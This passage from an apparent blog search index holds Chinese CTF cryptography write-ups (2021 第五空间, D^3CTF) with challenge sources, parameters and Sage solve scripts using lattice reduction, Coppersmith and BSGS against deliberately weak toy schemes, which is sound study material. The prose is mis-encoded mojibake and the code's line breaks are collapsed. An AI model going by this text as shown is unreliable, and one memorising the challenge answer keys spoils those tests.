97,208,130,165,41,180,176,160,20,155,149,213,181,81,62,173,108,80,86,182,35,209,190,217,187,180,201,225,112,125,95,118,48,137,96,79,127,206,49,85,143,139,200,194,49,6,208,109,5,197,75,150,134,194,0,191,72,16,101,4,85,178,131,52,94,139,140,42,14,14,178,94,60,175,16,179,216,14,154,220,136,176,42,145,71],[11,190,138,143,159,121,173,115,63,200,179,44,222,85,202,143,118,197,66,100,116,18,180,77,86,175,32,158,43,133,0,214,162,118,71,224,78,175,82,206,136,137,135,41,146,130,55,42,38,115,165,53,105,189,27,86,61,98,189,7,164,152,188,132,97,2,89,210,14,131,81,11,193,164,174,180,166,112,162,197,27,27,80,120,70,98,197,29,172,88,207,76,81,205,92,37,25,189,66,94,108,222,152,93,116,141,176,72,111,171,204,146,118,5,185,39,171,180,124,78,208,142,85,120,217,61,177,39,77,57,164,139,147,171,149,111,152,168,191,33,98,11,180],[153,44,17,75,199,75,208,31,100,124,210,206,174,223,216,194,156,157,213,101,212,117,162,194,38,184,118,126,10,92,168,197,78,113,71,154,43,177,202,115,27,34,174,54,201,97,112,180,169,32,134,160,104,183,0,145,179,106,156,182,213,214,144,43,226,191,66,34,217,187,137,40,103,194,103,217,13,87,84,151,225,190,26,100,101,30,79,173,207,32,32,150,195,105,162,78,61,16,32,151,4,59,50,219,220,133,13,31,104,122,93,181,5,150,188,25,222,77,111,2,41,12,129,138,107,74,30,145,21,165,192,115,119,118,112,223,74,76,167,167,218,80,121]])P = [[0 for _ in range(143)] for _ in range(143)]for i in range(143): P[i][i] = pM = M.stack(Matrix(P))lattice = IntegerLattice(M, lll_reduce=True)c = vector([158,93,224,147,157,86,28,224,141,124,150,117,110,88,186,115,109,119,166,206,210,89,28,63,110,16,156,125,122,201,147,185,53,211,46,1,100,217,69,12,147,64,136,20,88,198,43,110,126,101,113,81,170,190,93,82,10,217,184,32,39,18,184,214,24,190,78,152,160,62,152,38,214,16,37,28,125,51,20,54,91,220,214,47,95,113,140,226,133,185,11,214,207,189,94,92,223,34,61,168,191,163,152,203,201,215,106,180,114,140,198,177,215,201,208,152,221,0,59,147,205,3,181,104,199,205,27,145,51,105,83,17,32,221,214,194,193,148,65,20,183,102,174])'['+str(BabaisClosestPlaneAlgorithm(lattice.reduced_basis, c))[1:-1]+']' secretsproblem12345678910111213141516171819202122232425262728293031323334353637383940import random, hashlibfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom secret import flagassert(flag[:5] == b&quot;flag{&quot; and flag[-1:] == b&quot;}&quot;)flag = flag[5:-1]p = getPrime(512)secrets = [getPrime(32) for i in range(3)]a = [getPrime(511) for i in range(3)]e = [[random.randint(0,2) for i in range(3)] for j in range(3)]c = 0for i in range(3): tmp = 1 for j in range(3): tmp *= secrets[j] ** e[i][j] c += a[i] * tmp c %= pkey = hashlib.sha256(str(secrets).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)enc_flag = cipher.encrypt(flag).hex()print(p)print(a)print(e)print(c)print(enc_flag)'''12974234240047250882827277463970749648223428465145328709918053842153820677294215343957019413719473165129078971772191068642653862027980142472460705711018201[6208495304507502877592974397978564449062722480435998477821753565334623511793847345749111308898139670628857817327159494561065840693449298616913891952427947, 4428365792626193951517975036630823002373517124620690551190165499794155382003347632615508488697880129516880024881940903287205636949002132541035487795791827, 4718311857821047798142460474602800502374374326300654458450570361490723801361197812174259099714079434910279510299556693616702570294307587124784370853830179][[0, 2, 2], [1, 0, 1], [2, 1, 1]]8024639827831958040886215528711059283414630802186262470325506233115495366865722141662305750597559580380055075908821369972992187624854877285935207126822671bf550e796d6efc92e8543ffcbb8d81fd588900f8f7aecaeeee718d60eaace3bc''' èƒŒåŒ…é—®é¢˜$$(s_1s_2)^2 a_0 + s_0s_2a_1 + s^2_0s_1s_2a_2 + kp - c = 0$$ç»å…¸ä¸€ä¸ªç­‰å¼æµ$$((s_1s_2)^2 , s_0s_2 , s^2_0s_1s_2,1,k)\\begin{pmatrix}1&amp;0&amp;0&amp;0&amp;a_0\\cdot R \\0&amp;1&amp;0&amp;0&amp;a_1 \\cdot R\\0&amp;0&amp;1&amp;0&amp;a_2 \\cdot R\\0&amp;0&amp;0&amp;1&amp;-c \\cdot R\\0&amp;0&amp;0&amp;0&amp;p \\cdot R\\\\end{pmatrix}=((s_1s_2)^2 , s_0s_2 , s^2_0s_1s_2,1,0),R = 2 ^ i$$è¿™é‡Œçš„$R$æ˜¯ä¸ºäº†è°ƒæ ¼å­çš„det, è°ƒåˆ°èƒ½æ‰¾åˆ°ç›®æ ‡å‘é‡ä¸ºæ­¢, æ‰¾åˆ°ç­‰å¼å³è¾¹çš„å‘é‡å°±èƒ½ç®—å‡º$s_0,s_1,s_2$ exp12345678910111213141516171819202122232425import random, hashlibfrom Crypto.Util.number import *from Crypto.Cipher import AESenc_flag = 0xbf550e796d6efc92e8543ffcbb8d81fd588900f8f7aecaeeee718d60eaace3bca = [6208495304507502877592974397978564449062722480435998477821753565334623511793847345749111308898139670628857817327159494561065840693449298616913891952427947, 4428365792626193951517975036630823002373517124620690551190165499794155382003347632615508488697880129516880024881940903287205636949002132541035487795791827, 4718311857821047798142460474602800502374374326300654458450570361490723801361197812174259099714079434910279510299556693616702570294307587124784370853830179]p = 12974234240047250882827277463970749648223428465145328709918053842153820677294215343957019413719473165129078971772191068642653862027980142472460705711018201c = 8024639827831958040886215528711059283414630802186262470325506233115495366865722141662305750597559580380055075908821369972992187624854877285935207126822671i = 128R = 2**iM = Matrix([[1,0,0,0,a[0] * R],[0,1,0,0,a[1] * R],[0,0,1,0,a[2] * R],[0,0,0,1,-c * R],[0,0,0,0,p * R]])L = M.BKZ()s3 = gcd(L[0][0],abs(L[0][1]))s1 = abs(L[0][1]) // s3s2 = sqrt(abs(L[0][0]) // s3 // s3)secrets = [s1,s2,s3]key = hashlib.sha256(str(secrets).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)flag = cipher.decrypt(long_to_bytes(enc_flag))flag signinproblem123456789101112131415161718192021222324from Crypto.Util.number import *from secret import flagp = getPrime(512)q = getPrime(512)n = p * qe = 0x10001x = (p ^ q) &amp; ((1 &lt;&lt; 400) - 1)m = bytes_to_long(flag)c = pow(m,e,n)print(&quot;c = &quot; + str(c))print(&quot;e = &quot; + str(e))print(&quot;n = &quot; + str(n))print(&quot;x = &quot; + str(x))'''c = 41079136228776331983513986502894911009747944746334405367181525535644429164244074690458675696682154772257649811625401364517966224711291000199478649309514306511977247475050430881892635166215911325729515065570801798281126631754714292634605360578171629351703909902943766832088848829679735266081587467028354629832e = 65537n = 88873300622677925132392673651975872286851841516213062658793503010409158793653030553313986481205677326846210604582870123515082097235868012724220463515351466605298734168814756198761860328588678124560858545154560701982246840286690871368569184620040790812223630254910190657002367120010677907467764741789052920477x = 138384108215091704603441412066611031482512354164750119910659929381838248956079740784293945420743011870999379776464932828''' plaidCTF 2021é‡Œé¢çš„é‚£ä¸ªxorsaæ”¹äº†ä¸€ä¸‹ æŠŠç»™å‡ºæ¥çš„p ^ q çš„ä½æ•°å‡å°‘åˆ°äº†400ä½ ä¾æ—§å¯ä»¥ç”¨bfså¾—åˆ°pçš„ä½400å·¦å³çš„ä½æ•° ç„¶åcopper pä¸€å…±å°±512ä½ exp123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *from tqdm import tqdmc = 41079136228776331983513986502894911009747944746334405367181525535644429164244074690458675696682154772257649811625401364517966224711291000199478649309514306511977247475050430881892635166215911325729515065570801798281126631754714292634605360578171629351703909902943766832088848829679735266081587467028354629832e = 65537n = 88873300622677925132392673651975872286851841516213062658793503010409158793653030553313986481205677326846210604582870123515082097235868012724220463515351466605298734168814756198761860328588678124560858545154560701982246840286690871368569184620040790812223630254910190657002367120010677907467764741789052920477x = bin(138384108215091704603441412066611031482512354164750119910659929381838248956079740784293945420743011870999379776464932828)[2:]P = []def find(guessp,i): p = int(guessp,2) q = int(x[-i:],2) ^^ p if (q * p) % 2 ** i == n % 2 ** i: if i == 399: P.append(p) else: find('1'+guessp,i+1) find('0'+guessp,i+1)find('1',1)print(len(P))pbits = 512for i in tqdm(range(len(P))): _p = P[i] kbits = 512 - len(bin(_p)[2:]) R.&lt;x&gt; = Zmod(n)[] f = P[i] + x * 2^len(bin(_p)[2:]) f = f.monic() roots = f.small_roots(X=2^kbits,beta=0.4) if roots: p = int(_p + roots[0]* 2^len(bin(_p)[2:])) print(_p + roots[0]* 2^len(bin(_p)[2:])) breakq = n // passert p * q == nphi = (q - 1) * (p - 1)d = inverse_mod(e,phi)long_to_bytes(pow(c,d,n))","link":"/2021/09/18/writeup-for-2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"},{"title":"writeup for 2021AntCTFxD^3CTF Crypto","text":"å•Šè¿™æ¬¡çš„è¿™ä¸ªæ¯”èµ›å› ä¸ºä¸ä¼šLattice, å¯¼è‡´åŸºæœ¬ä¸ä¼šåšå•Š, è™½ç„¶æ¯”èµ›ååŠæ®µå»å­¦äº†ä¹Ÿè¯•ç€åšäº†, è™½ç„¶æ ¼å­é€ å‡ºæ¥è¿˜è¢«è‡ªå·±è ¢åˆ°äº†, ä½†è¿˜æ˜¯â€¦æ”¶è·å¾ˆå¤šhh è®°å½•ä¸€ä¸‹å§ babylatticeå½“æ—¶åšé¢˜çš„æ—¶å€™å®Œå…¨æ²¡æœ‰çœ‹åˆ°æ˜æ–‡å°±æ˜¯ä¸€ä¸ªæ•°å­—, å¹¶ä¸èƒ½è½¬æ¢æˆæœ‰è¯­ä¹‰çš„å­—ç¬¦ä¸²â€¦.å¯¼è‡´æ ¼å­éƒ½é€ å‡ºæ¥äº†è¿˜ä¸€ç›´å¡ç€ä½†ä¹Ÿä½“ä¼šåˆ°äº†ä¸€äº›é€ æ ¼å­çš„æ–¹æ³•, ä»¥åŠæ ¼çº¦å‡ºå‘é‡åéœ€è¦æ³¨æ„çš„åœ°æ–¹ problem12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from collections import namedtuplePublicKey = namedtuple('PublicKey', ['n', 'b'])SecretKey = namedtuple('SecretKey', ['p', 'q', 'A'])def gen_key(): p = random_prime(2^512, lbound=2^511) q = random_prime(2^512, lbound=2^511) n = p * q a11, a12, a21 = [random_prime(2^100) for _ in range(3)] a22 = random_prime(2^100) while a11 * a22 == a12 * a21: a22 = random_prime(2^100) A = Matrix(ZZ, [[a11, a12], [a21, a22]]) a1 = crt([a11, a21], [p, q]) a2 = crt([a12, a22], [p, q]) b = a1 * inverse_mod(a2, n) % n PK = PublicKey(n, b) SK = SecretKey(p, q, A) return (PK, SK)def encrypt(m, pk): assert 0 &lt; m &lt; 2^400 r = randint(0, 2^400-1) c = (pk.b*m + r) % pk.n return cdef decrypt(c, sk): a2 = crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q]) s1 = a2 * c % sk.p s2 = a2 * c % sk.q m, r = sk.A.solve_right(vector([s1, s2])) return mdef test(pk, sk, num=3): for _ in range(num): m = randint(0, 2^400-1) c = encrypt(m, pk) mm = decrypt(c, sk) assert m == mmif __name__ == '__main__': from hashlib import sha256 from secret import m, FLAG assert FLAG == 'd3ctf{%s}' % sha256(int(m).to_bytes(50, 'big')).hexdigest() PK, SK = gen_key() test(PK, SK) c = encrypt(m, PK) print(f&quot;PK = {PK}&quot;) print(f&quot;c = {c}&quot;)&quot;&quot;&quot;PK = PublicKey(n=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361, b=65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196)c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570&quot;&quot;&quot; å‡ºç°çš„å‚æ•° $m$: æ˜æ–‡, $m \\in (0,2^{400})$ $c = m \\cdot b + r \\ (mod\\ n)$ : å¯†æ–‡, å…¶ä¸­$r \\in (0,2^{400})$ $A = \\begin{pmatrix} a_{11}&amp;a_{21}\\\\a_{12}&amp;a_{22}\\end{pmatrix}$å››ä¸ª$a$éƒ½æ˜¯100-Bit $p,q$: 512-Bit prime $a1 = crt([a11, a21], [p, q])\\ a2 = crt([a12, a22], [p, q])$ $b = a_1 \\cdot a_2^{-1} mod \\ n$ åˆ†æç”±$c = m \\cdot b + r (mod \\ n)$å¯ä»¥å¾—åˆ°$c = m \\cdot b + r + \\mu n$ ç§»é¡¹æœ‰$c - m \\cdot b - \\mu n = r$ è€ƒè™‘åˆ°$m,r$éƒ½æ˜¯æœªçŸ¥çš„, è€Œä¸”éƒ½æ˜¯400ä½ä»¥ä¸‹, å°è¯•æ„é€ æ ¼å­å°†$m,r$è§„çº¦å‡ºæ¥ è¿™é‡Œçš„å¼å­å·¦è¾¹æœ‰ä¸‰ä¸ªé¡¹, æ‰€ä»¥æ„é€ ä¸€ä¸ª3ç»´çš„æ ¼å­ å› ä¸ºæ˜¯ä¸‰ç»´çš„æ ¼å­, æ‰€ä»¥æœ€çŸ­å‘é‡çš„å¤§å°å¤§æ¦‚æ˜¯$det(\\mathcal L)^{1/3}$ è€Œ$m,r \\leq 2^{400}$, æ‰€ä»¥éœ€è¦å°†æ ¼å­çš„$Det$æ”¾å¤§ä¸€ç‚¹$$\\begin{pmatrix}2^{200}&amp;0&amp;c\\\\0&amp;1&amp;-b\\\\0&amp;0&amp;-n\\end{pmatrix}$$é‚£ä¹ˆä¼šæœ‰$$(1 ,m,\\mu)\\begin{pmatrix}2^{200}&amp;0&amp;c\\\\0&amp;1&amp;-b\\\\0&amp;0&amp;-n\\end{pmatrix}=(2^{200},m,r)$$å³,å­˜åœ¨ä¸€ä¸ªæ ¼ç‚¹$(2^{200},m,r)$, ç”¨LLLè§„çº¦å³å¯ 1234567891011n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570v1 = vector(ZZ, [2^200, 0,c])v2 = vector(ZZ, [0, 1,-b])v3 = vector(ZZ, [0, 0,-n])Lattice = matrix([v1,v2,v3])m = abs(Lattice.LLL()[0][1])from hashlib import sha256print( 'd3ctf{%s}' % sha256(m).hexdigest()) æ³¨æ„åˆ°å®é™…æ ¼çº¦å‡ºæ¥çš„å‘é‡æ˜¯å…¨è´Ÿçš„, å› ä¸º$(-2^{200},-m,-r)$ä¹Ÿåœ¨æ ¼å­é‡Œé¢, æ‰€ä»¥è®°å¾—åŠ ä¸ªabs() é¢„æœŸè§£è¿™æ¬¡çš„é¢˜ç¬¬ä¸€é¢˜å¦‚æœä¸æ˜¯åšçš„é¢„æœŸè§£é‚£ä¹ˆç¬¬äºŒé¢˜å°±ä¼šç‰¹åˆ«çš„éš¾, æ‰€ä»¥ä¹Ÿé¡ºä¾¿å­¦ä¹ äº†ä¸€ä¸‹é¢„æœŸè§£çš„åšæ³•(å‡ºé¢˜äººé¢„æœŸäº†éé¢„æœŸè§£ å¦‚æœä¸ä»$c = b \\cdot m + r (mod \\ n)$å…¥æ‰‹çš„è¯, å°±å…ˆçœ‹çœ‹å‰é¢å‡ ä¸ªå‚æ•°çš„å…³ç³»$$\\begin{array}{}a_1 \\equiv a_{11} \\ (mod \\ p)\\\\a_1 \\equiv a_{21} \\ (mod \\ q)\\\\\\end{array}\\quad\\begin{array}{}a_2 \\equiv a_{12} \\ (mod \\ p)\\\\a_2 \\equiv a_{22} \\ (mod \\ q)\\\\\\end{array}\\quadb \\equiv a_1 \\cdot a_2^{-1} \\ (mod \\ n)$$ä¸Šé¢è¿™ä¸‰ä¸ªå¼å­, å¯ä»¥å¾—åˆ°è¿™ä¹ˆä¸€ä¸ªæ–¹ç¨‹ç»„$$\\begin{array}{}a_{12} \\cdot b = a_{11} + k_1p \\\\a_{22} \\cdot b = a_{21} + k_2q\\end{array}$$åšåˆ°è¿™é‡Œçš„æ—¶å€™, æœ‰æƒ³è¿‡æŠŠæ–¹ç¨‹ç»„çš„ä¸¤ä¸ªå¼å­ç›¸ä¹˜, å¾—åˆ°çš„ä¼šæ˜¯$$a_{12}a_{22}b^2 = a_{11}a_{21} + k_2a_{11}q + k_1a_{21}p + k_1k_2pq$$ä½†æ˜¯è¿™é‡Œå·²çŸ¥çš„é‡åªæœ‰$b,pq$, ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¸ªå¼å­é‡Œ, æœ‰ä¸‰é¡¹ä¸€ä¸ªå·²çŸ¥çš„éƒ½æ²¡æœ‰, è¿™æ ·æ˜¯æ²¡åŠæ³•é€ æ ¼å­çš„, åˆ°è¿™é‡Œå°±å¡ä½äº†, ä¸å¾—ä¸ç¿»çœ‹wp, æ‰å‘ç°, åŸæ¥å¯ä»¥æŠŠ$a_{11}, a_{21}$ç§»åˆ°å·¦è¾¹å†ç›¸ä¹˜, è¿™æ ·å°±åªæœ‰ä¸€ä¸ªé¡¹æ˜¯æœªçŸ¥çš„äº†!$$\\begin{array}{}a_{12} \\cdot b - a_{11} = k_1p \\\\a_{22} \\cdot b - a_{21} = k_2q\\end{array}\\Rightarrowa_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) + a_{11}a_{21} = k_1k_2pq$$è®°$K = k_1k_2,n = pq$å†ç§»ä¸€ä¸‹é¡¹$$a_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) - Kn = -a_{11}a_{21}$$ç„¶åå°±æ˜¯å–œé—»ä¹è§çš„é€ æ ¼å­$$(a_{12}a_{22}, -(a_{12}a_{21}+a_{11}a_{22}), -K)\\begin{pmatrix}1&amp;0&amp;b^2\\\\0&amp;-1&amp;b\\\\0&amp;0&amp;n\\end{pmatrix}=(a_{12}a_{22}, a_{12}a_{21}+a_{11}a_{22}, -a_{11}a_{21})$$å¯ä»¥çœ‹åˆ°å³ä¾§çš„å‘é‡é•¿åº¦å¾ˆçŸ­, å¯ä»¥è§„çº¦å‡ºæ¥ 1(1173142580751247504024100371706709782500216511824162516724129,1382843159437215516163973075066558157591473749635266665605630,-211380743487233628797755584958526337321408979158793229985661) å› ä¸ºå››ä¸ª$a$éƒ½æ˜¯100ä½çš„ç´ æ•°, ç›´æ¥ç”¨http://www.factordb.comåˆ†è§£$$1018979931854255696816714991181\\\\1151291153120610849180830073509\\\\207806651167586080788016046729\\\\1017199123798810531137951821909$$å› ä¸º$gcd(a_{12} \\cdot b - a_{11} , n) = p$, çŒœä¸€ä¸‹ä¸Šé¢å››ä¸ªæ•°å“ªä¸¤ä¸ªæ˜¯$a_{12},a_{11}$å°±å¯ä»¥å¾—åˆ°$p$äº†, å¾—åˆ°$p$å°±å¯ä»¥åˆ†è§£$n$, ç›´æ¥å¾—åˆ°æ‰€æœ‰çš„å‚æ•°, è·‘è§£å¯†ç®—æ³•å°±å¯ä»¥å¾—åˆ°æ˜æ–‡äº† simpleGroupè¿™é¢˜æ¯”èµ›çš„æ—¶å€™ä¹Ÿæ²¡åšå‡ºæ¥(ç¬¬ä¸€é¢˜éƒ½åšä¸å‡ºæ€ä¹ˆåšè¿™é¢˜), æ¯”å®Œèµ›åšäº†ç¬¬ä¸€é¢˜æ‰åšè¿™é¢˜å•Šå•Šå•Šä½†æ˜¯å› ä¸ºå¤ªä¹…æ²¡åšæ¬¡å¹‚çš„è¿ç®—å¯¼è‡´åšäº†å¥½ä¹…â€¦â€¦. problem12345678910111213141516171819202122from random import randintfrom secret import FLAG# A gift for key recovery in challenge [babyLattice]n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487M = int.from_bytes(FLAG, 'big')C = []while M != 0: m = M % e M //= e r = randint(0, n-1) c = power_mod(y, m, n) * power_mod(r, e, n) C.append(c % n)print(f&quot;C = {C}&quot;)&quot;&quot;&quot;C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428]&quot;&quot;&quot; åˆ†æ$n$ ç”¨çš„è¿˜æ˜¯ç¬¬ä¸€é¢˜çš„, æ‰€ä»¥ç¬¬ä¸€é¢˜åˆ†è§£å‡ºæ¥çš„$p,q$è¿™é¢˜å°±æœ‰ç”¨äº† åŠ å¯†çš„å¼å­å¤§æ¦‚æ˜¯$c_i = y^{m_i} \\cdot r^{e} \\ (mod \\ n)$ ,$c,y,e$éƒ½æ˜¯å·²çŸ¥çš„, è€Œä¸”$m_i &lt; e$ å› ä¸º$r$æ˜¯ä¸çŸ¥é“çš„, è‚¯å®šè¦æƒ³åŠæ³•æ¶ˆå»$r$ , (æœ‰çš„å¸ˆå‚…ä¸æ¶ˆå»$r$ä¹Ÿå¯ä»¥åš, å¾…ä¼šä¸‹é¢è¡¥å……ä¸€ä¸‹) è¿™é‡Œçš„$e$æ¯”è¾ƒç‰¹æ®Š, $gcd(e, (p-1)(q-1)) =e $ è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¡ç®—ä¸€ä¸ª$d = {phi \\over e}$, ä½¿å¾—$r^{ed} = r^{phi} = 1 (mod \\ n)$, æ¬§æ‹‰å®šç†yyds åŠ å¯†çš„å¼å­ä¸¤è¾¹æ¥ä¸ª$d$æ¬¡å¹‚, å°±ä¼šæœ‰$$c_i^d = y^{md} \\ (mod \\ n)$$åšåˆ°è¿™é‡Œæƒ³æŠŠ$d$æ¶ˆå»å†ç”¨bsgsæ±‚ç¦»æ•£å¯¹æ•°, ä½†å› ä¸º$d \\ mod \\ phi$æ²¡æœ‰é€†å…ƒå¡äº†å¥½ä¹…, çœŸçš„è ¢â€¦ è¿™é‡Œ$y$æ˜¯å·²çŸ¥çš„, ç›´æ¥çœ‹æˆ$c_i^d = (y^{d})^m \\ (mod \\ n)$, ç”¨bsgså°±å®Œäº‹äº†(ç”¨bsgsæ˜¯å› ä¸ºmçš„èŒƒå›´æ˜¯å·²çŸ¥çš„) exp123456789101112131415161718192021222324252627282930from random import randintn=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487C = [...]a11 = 207806651167586080788016046729a12 = 1151291153120610849180830073509p = gcd(b * a12 - a11,n)q = n // pphi = (p-1) * (q-1)M = []assert gcd(e,phi) == ed = phi // eassert pow(pow(randint(0,n-1),e,n),d,n) == 1bounds = ( 1,e )F = IntegerModRing(n)for i in C: cd = pow(i,d,n) yd = pow(y,d,n) M.append(bsgs(F(yd),F(cd),bounds))flag = 0for i in M[::-1]: flag = int(flag) * int(e) + int(i)from Crypto.Util.number import long_to_bytesprint(long_to_bytes(flag)) ä¸ç”¨æ¶ˆå»$r$çš„è§£https://www.anquanke.com/post/id/233827#h2-4, è¿™ä½å¸ˆå‚…åšçš„ ä¸€æ ·å…ˆçœ‹ä¸€ä¸‹åŠ å¯†çš„å¼å­$c = y^{m} \\cdot r^{e} \\ (mod \\ n)$ è¿™é¢˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç‚¹å°±æ˜¯$e$å¯ä»¥è¢«åˆ†è§£ä¸º$e_1$å’Œ$e_2$ä¸¤ä¸ªç´ æ•°ï¼Œè¿™ä¸¤ä¸ªç´ æ•°åˆåˆ†åˆ«æ˜¯$p-1$å’Œ$q-1$çš„å› å­ æ‰€ä»¥ä¼šæœ‰$$m = i \\cdot e_1 + j \\\\c \\equiv y^{j} \\cdot (y^{i} \\cdot r^{e_2})^{e_1} \\ (mod \\ p) \\\\câ€™ \\equiv c \\cdot y^{-j} \\equiv (y_i \\cdot r^{e_2})^{e_1} \\ (mod \\ p)$$å› ä¸º$j$æ˜¯ä¸€ä¸ªæ¯”è¾ƒå°çš„æ•°, å¯ä»¥é€šè¿‡éå†$j$, å†åˆ¤æ–­$c \\cdot y^{-j}$æ˜¯å¦æ˜¯$p$çš„$e_1$æ¬¡å‰©ä½™, å°±å¯ä»¥å¾—åˆ°$m \\ mod \\ e_1$ åŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾—åˆ°$m \\ mod \\ e_2$ å†é€šè¿‡ä¸­å›½å‰©ä½™å®šç†å°±èƒ½å¾—åˆ°$m$äº† è¿™é‡Œæœ‰ä¸ªç´ æ•°æ¨¡çš„$n$æ¬¡å‰©ä½™çš„åˆ¤æ–­æ–¹æ³•, å¾ˆç®€å•, $x$ ä¸ºæ¨¡$p$çš„$n$æ¬¡å‰©ä½™çš„å……è¦æ¡ä»¶ä¸º$$x^{p-1} \\equiv 1 \\ (mod \\ p)$$ exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from Crypto.Util.number import *import gmpy2p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487e1 = 36493e2 = 52859def GCRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) K = c // d * gmpy2.invert(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return (cura % curm, curm) def check(d,p,n): if((p - 1) % n == 0): return pow(d,(p - 1) // n,p) == 1 else: k = gmpy2.gcd(n, p - 1) return pow(d,(p - 1) // k,p) == 1def getM(c,e,p): for i in range(2,e): tmpc = (c * gmpy2.invert(pow(y,i,p),p)) % p if check(tmpc,p,e): return i exit(0)C = [...]m = 0for c in C[::-1]: cp = c % p cq = c % q m1 = getM(cp,e1,p) m2 = getM(cq,e2,q) mm,lcm = GCRT([e1,e2],[m1,m2]) print(&quot;Get mm: &quot; + hex(mm)) m *= e m += mmflag = 